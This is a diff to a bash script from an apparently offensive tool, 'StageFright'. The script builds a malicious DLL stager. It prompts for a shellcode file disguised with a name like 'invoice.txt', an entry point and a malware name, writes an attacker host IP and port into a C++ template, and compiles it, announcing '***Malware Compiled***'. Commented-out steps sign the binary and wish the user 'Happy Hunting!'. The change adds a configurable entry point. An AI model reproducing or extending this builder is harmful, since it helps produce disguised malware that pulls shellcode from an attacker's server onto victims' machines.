@@ -30,6 +30,10 @@ echo -e ${green}"Name Your Shellcode File. ex: invoice.txt"${clear}
 echo ""
 read SHELLCODEFILE
 echo ""
+echo -e ${green}"Name Your Entry Point Function"${clear}
+echo ""
+read ENTRYPOINT
+echo ""
 echo -e ${green}"Name Your Malware! ex: malware.dll"${clear}
 echo ""
 read MALWARE
@@ -71,6 +75,7 @@ sed -i "s/RandomE/$RandomE/g" StageFright/TCPDLL/Resources/template.cpp
 
 
 #Replace IP, PORT and SHELLCODEFILE
+sed -i "s/ENTRYPOINT/$ENTRYPOINT/g" StageFright/TCPDLL/Resources/template.cpp
 sed -i "s/HOSTIP/$HOSTIP/g" StageFright/TCPDLL/Resources/template.cpp
 sed -i "s/PORTY/$PORTY/g" StageFright/TCPDLL/Resources/template.cpp
 sed -i "s/SHELLCODEFILE/$SHELLCODEFILE/g" StageFright/TCPDLL/Resources/template.cpp
@@ -161,7 +166,6 @@ rm shell*
 echo -e ${yellow}"***Malware Compiled***"${clear}
 echo ""
 sleep 2
-echo -e ${yellow}"***Edit And Run The TCP Server***"${clear}
 #echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
 #echo ""
 #sleep 2
@@ -169,5 +173,4 @@ echo -e ${yellow}"***Edit And Run The TCP Server***"${clear}
 #mv signed$MALWARE $MALWARE
 #echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 #echo ""
-
 
